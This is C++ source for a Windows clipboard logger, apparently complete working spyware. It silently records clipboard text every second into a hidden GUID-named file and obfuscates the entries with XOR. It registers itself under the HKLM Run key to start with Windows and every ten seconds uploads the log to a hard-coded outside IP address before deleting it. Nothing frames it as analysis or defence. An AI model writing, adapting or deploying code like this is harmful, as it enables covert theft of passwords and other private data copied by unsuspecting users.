//clipboard logger
//g++ -o cliplog cliplog.cpp -mwindows -lws2_32 -liphlpapi
#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <tlhelp32.h>
#include <cstring>
#include <winuser.h>
#include <ctime>
#include <process.h>
#include <iphlpapi.h>
#include <icmpapi.h>

#define SIZE 1000000
#define FILE_NAME "{6CD3D31F-BEE8-481F-8EFD-F31F85D6D6F3}"
using namespace std;

HANDLE hMutex;
bool WINAPI PingTest(){
	HANDLE hIcmpFile;
	unsigned long ipaddr;
	DWORD dwRetVal = 0, ReplySize = 0;
	char SendData[5] = "PING";
	LPVOID ReplyBuffer = NULL;
	
	ipaddr = inet_addr("8.8.8.8");
	hIcmpFile = IcmpCreateFile();
	
	ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
	ReplyBuffer = (VOID*) malloc(ReplySize);
	
	dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 1000);
	if(dwRetVal)return true;
	else return false;
}

DWORD32 WINAPI Connect_Server(LPVOID lpParam){
	while(1){
		Sleep(10000);
		if(PingTest()){
			WSADATA wsaData;
			SOCKET sock;
			SOCKADDR_IN serverAddr;
			char sendMSG[SIZE];
			int result;
			WSAStartup(MAKEWORD(2,2),&wsaData);
		
			sock=socket(PF_INET,SOCK_STREAM,0);
		
			memset(&serverAddr,0,sizeof(serverAddr));
			serverAddr.sin_family=AF_INET;
			serverAddr.sin_addr.s_addr=inet_addr("203.229.206.22");
			serverAddr.sin_port=htons(0x226E);
		
			if(connect(sock,(SOCKADDR*)&serverAddr,sizeof(serverAddr))!=SOCKET_ERROR){
				FILE* fp = fopen(FILE_NAME,"rb+");
				if(!fp){
					char no[8]="a`/ifcj";
					send(sock,no,strlen(no),0);
				}
				else{
					while(1){
						result=fread(sendMSG,sizeof(char),SIZE,fp);
						send(sock,sendMSG,result,0);
						if(feof(fp))break;
					}
				}
				fclose(fp);
				DeleteFile(FILE_NAME);
			}
			closesocket(sock);
			WSACleanup();
		}
	}
}
LPSTR Encrypt(LPSTR str){
	int len=strlen(str);
	for(int i=0;i<len;i++)str[i]=str[i]^0x0f;
	return str;
}
LPVOID Register(){
	LONG lResult;
	HKEY hKey;
	DWORD dwType;
	DWORD dwBytes=100;
	char buffer[100];
	char reg_name[10]="clip";
	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	
	lResult=RegQueryValueEx(hKey, reg_name, 0, &dwType, (LPBYTE)buffer, &dwBytes); 
	char path[200];
	GetModuleFileName(NULL, path, 200);
	if(lResult != ERROR_SUCCESS){
		DWORD dwDesc;
		lResult = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, buffer, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDesc);
		if(lResult == ERROR_SUCCESS) {
			RegSetValueEx(hKey, reg_name, 0, REG_SZ, (BYTE*)path, strlen(path));
		}
		else{
			DeleteFile(path);
		}
	}
	else{
		DeleteFile(path);
	}
	RegCloseKey(hKey);
}
DWORD32 WINAPI clip(LPVOID lpParam){
	char* last=NULL;
	last=(char*)malloc(sizeof(char)*3+1);
	strcpy(last,"***");
	while(1){
		Sleep(1000);
		OpenClipboard(0);
		if(IsClipboardFormatAvailable(CF_TEXT)||IsClipboardFormatAvailable(CF_OEMTEXT)){
			HANDLE hClipboard;
			hClipboard = GetClipboardData(CF_TEXT);
			char* datum = (char*)GlobalLock(hClipboard);
			if(strcmp(datum,last)!=0){
				free(last);
				time_t t = time(NULL);
				struct tm tm = *localtime(&t);
				WaitForSingleObject(hMutex, INFINITE);
				FILE* fp = fopen(FILE_NAME,"a+");
				char date[100];
				sprintf(date,"=============%d-%d-%d %d:%d:%d=============\n", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
				fprintf(fp,"%s",Encrypt(date));
				char* data = (char*)malloc(sizeof(char)*(strlen(datum)+42)+1);
				sprintf(data,"%s\n=======================================\n\n",datum);
				fprintf(fp,"%s",Encrypt(data));
				fclose(fp);
				ReleaseMutex(hMutex);  
				last=(char*)malloc(sizeof(char)*strlen(datum)+1);
				strcpy(last,datum);
			}
		}
		CloseClipboard();
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPram, int nCmdShow){
	DWORD dwThreadId = 1;
	char path[100];
	Register();
	strcpy(path,getenv("appdata"));
	strcat(path,"\\..\\Local");
	SetCurrentDirectory(path);
	
	hMutex = CreateMutex(NULL,FALSE,NULL);
	
	HANDLE hThreadc = (HANDLE)_beginthreadex(NULL,0,clip,NULL,0,(DWORD32*)&dwThreadId);
	HANDLE hThreads = (HANDLE)_beginthreadex(NULL,0,Connect_Server,NULL,0,(DWORD32*)&dwThreadId);
	
	MSG Message;
	while(GetMessage(&Message,NULL,0,0)){
		DispatchMessage(&Message);
	}
	CloseHandle(hThreads);
	CloseHandle(hThreadc);
	return (int)Message.wParam;
}
